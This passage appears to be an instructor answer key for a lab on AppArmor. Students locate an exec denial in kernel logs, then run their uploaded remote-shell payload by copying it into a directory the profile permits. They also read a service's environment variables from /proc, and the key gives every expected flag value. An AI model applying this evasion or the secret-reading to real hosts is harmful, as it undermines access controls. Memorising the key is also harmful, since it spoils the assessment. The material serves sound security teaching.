- The denied `name=` path is the hard link the gate built with `ln -f`, not a file the student created. The gate executes `.aa-deny-<denial_flag>-<epoch>`, and AppArmor logs that path. A symlink would be logged as the uploaded file, so the flag would not appear. Parse `denial_flag` as the segment after `.aa-deny-` and before `-<epoch>`.

Arguments:

- `journalctl -k --no-pager` — `-k` kernel messages; `--no-pager` so the demo does not stop in `less`.
- Optional `grep -i apparmor | tail -n 40` — case-insensitive AppArmor filter; last 40 lines after the denial was just generated.

Expected finding:

- One native evidence source shows the AppArmor denial entry for the blocked run.
- The denial artifact includes the `denial_flag` token in the denied-path marker.

Expected denial evidence excerpt:

```
apparmor="DENIED" operation="exec" profile="/usr/local/bin/objective-gate-check" name="/home/badguy/downloads/.aa-deny-THORN-BARRIER-<timestamp>"
```

Flag recovered:

- `denial_flag` = `THORN-BARRIER` by default.

### 9. Pivot to allowed action, run payload first, then recover flags 3 + 4

Re-read the gate profile already opened in Step 4, then copy the same payload into the allowed directory. Teach the path from the `/** rix,` line by eye. The `sed` extractor is optional shorthand after that line is identified.

```
sed -n '1,80p' /etc/apparmor.d/usr.local.bin.objective-gate-check
cp /home/badguy/downloads/runtime_probe.elf /var/tmp/.cache-bin/runtime_probe.elf
chmod +x /var/tmp/.cache-bin/runtime_probe.elf
```

Optional after the `/** rix,` line is identified:

```
ALLOWED_DIR="$(sed -n 's/^\s*\(\/[^ ]*\)\/\*\* rix,/\1/p' /etc/apparmor.d/usr.local.bin.objective-gate-check | head -n1)"
cp /home/badguy/downloads/runtime_probe.elf "${ALLOWED_DIR}/runtime_probe.elf"
chmod +x "${ALLOWED_DIR}/runtime_probe.elf"
```

Why:

- Return to the gate profile because Step 4 already showed `/var/tmp/.cache-bin/** rix,` versus `audit deny … x` on downloads. Same binary, different path, no policy edit, no sudo.
- Copy then `chmod +x` into that directory because execute is allowed only there.

Arguments:

- `sed -n 's/^\s*\(\/[^ ]*\)\/\*\* rix,/\1/p'` — pull the directory from the `/** rix,` line already identified by eye. Do not use this one-liner as the primary demo.

Start the payload from the allowed path, then run the gate against that same path:

```
/var/tmp/.cache-bin/runtime_probe.elf &
/usr/local/bin/objective-gate-check /var/tmp/.cache-bin/runtime_probe.elf
```

Why:

- Start the payload from the allowed path **before** the gate because the gate does not exec the binary on success. It `pgrep`s for that path and only then prints `upload_flag` and `allowed_path_flag`. Wrong order is not an AppArmor deny.
- If Meterpreter was used, have a listener ready. A callback proves allowed exec; it is not a flag source.

Arguments:

- `/var/tmp/.cache-bin/runtime_probe.elf &` — `&` backgrounds so the SSH session stays usable.

Expected wrong-order output (payload not started yet):

```
Payload not currently running. Start your remote-shell payload first, then run gate again.
```

Expected behavior:

- Direct payload execution from allowed path succeeds (for example, callback/session appears on attacker listener).
- Gate run succeeds from allowed path.
- Output includes:
    - `upload_flag=...`
    - `allowed_path_flag=...`

Expected successful gate output:

```
upload_flag=VECTOR-ASCENT
allowed_path_flag=CLEAR-PASSAGE
```

Flags recovered:

- `upload_flag` = `VECTOR-ASCENT` by default.
- `allowed_path_flag` = `CLEAR-PASSAGE` by default.

### 10. Recover flag 5 (`objective_flag`)

Run:

```
systemctl status runtime-cache-worker --no-pager
systemctl cat runtime-cache-worker --no-pager
PID="$(pgrep -f /usr/local/sbin/runtime-cache-worker | head -n1)"
tr '\0' '\n' < "/proc/${PID}/environ"
# Optional after manual review:
# tr '\0' '\n' < "/proc/${PID}/environ" | grep '^OBJECTIVE_FLAG='
```

Why:

- README item 6 (Step 5) and the student clue both say one flag is process-context runtime metadata. Step 3 listed `/usr/local/sbin/runtime-cache-worker`. `systemctl status` and `systemctl cat` map that binary to a live unit and show `EnvironmentFile=` and `ExecStart=`.
- `/proc/<pid>/environ` is the graded evidence (live process), not a guessed variable name. The env file is corroboration.

Arguments:

- `systemctl status … --no-pager` / `systemctl cat … --no-pager` — `--no-pager` avoids `less`.
- `pgrep -f /usr/local/sbin/runtime-cache-worker` — `-f` match full command line; take one PID (or use Main PID from `status`).
- `tr '\0' '\n' < /proc/${PID}/environ` — environ is NUL-separated; translate NUL to newline. Optional `grep '^OBJECTIVE_FLAG='` only after the full environ is reviewed.

Expected finding:

- A running `runtime-cache-worker` process exists in the expected context.
- Process environment includes `OBJECTIVE_FLAG=<value>`.

Expected `systemctl cat` excerpt:

```
EnvironmentFile=/etc/default/runtime-cache-worker
ExecStart=/usr/local/sbin/runtime-cache-worker
```

Expected environment excerpt:

```
OBJECTIVE_FLAG=RUNTIME-NEXUS
RUNTIME_CACHE_TAG=cache-maint
```

Flag recovered:

- `objective_flag` = `RUNTIME-NEXUS` by default.

### 11. Close with required report language

Students should be able to state:

- AppArmor is the active MAC system and is enforcing.
- Their initial objective path (uploaded binary in upload directory through gate) failed.
- The denial evidence source used (`dmesg`, `journalctl -k`, or `syslog`/`kern.log`) plus profile state evidence.
- Their alternate allowed path (discovered from AppArmor policy) and successful execution evidence.
- The process-context evidence used for `objective_flag`, independent of gate-success path output.

## Troubleshooting and Confirmation

If a fresh Collie or Cow deploy does not match this key, the host repair commands are in B03 range host recovery (`course/operations/b03-range-host-recovery.md`).

- If SSH fails, confirm the ops-station login, target IP, TCP 22, and Access-table credentials versus any range-rotated values.
- If `aa-status` is missing or shows AppArmor unloaded, the host is not in the expected lab state. Reapply Puppet for `cs_ops::lab_2_2` rather than switching MAC implementations.
- If the blocked gate run produces no denial flag, check native evidence in `dmesg`, `journalctl -k`, and `/var/log/syslog` or `/var/log/kern.log`. The flag is in those logs, not in the gate stderr alone.
- If `dmesg` is permission denied, check `adm` group membership and `kernel.dmesg_restrict`. Fall back to syslog or `kern.log`.
- If the gate prints `Payload not currently running`, start the binary from the allowed path, then re-run the gate. That message is not an AppArmor deny.
- If the allowed-path pivot fails, re-read the gate profile for the `/** rix,` rule. Do not edit policy; copy the same payload into the allowed directory from that evidence.
- If `system-maint-check` or `objective-gate-check` is not found, confirm `/usr/local/bin` is in `PATH` or invoke the full path from the Step 3 listing.
- If home paths show `hunter` instead of `badguy`, the node likely still has Puppet default `cs_ops::lab_2_2::student_user`. Use the live home path; do not assume the Access-table username matches every Hiera override.
- If recovered flag strings differ from this key, grade the Hiera values on that node, not the defaults table.

## Grading Checkpoints

1. **MAC identification:** Student identifies AppArmor and shows enforcement evidence.
2. **Blocked path evidence:** Student demonstrates failed objective path from upload location.
3. **Denial validation:** Student retrieves denial evidence and `denial_flag`.
4. **Allowed pivot:** Student executes same binary successfully from allowed path via gate.
5. **Objective completion:** Student recovers all five flags with reproducible command evidence, including independent process-context recovery for `objective_flag`.

## Acceptable Answers

- Equivalent command sequences are acceptable if they prove the same points.
- Equivalent uploaded binaries are acceptable (C, Go, static tools, etc.) if they are student-supplied and executable.
- For flags, require exact value matches unless your course rubric explicitly allows partial credit.
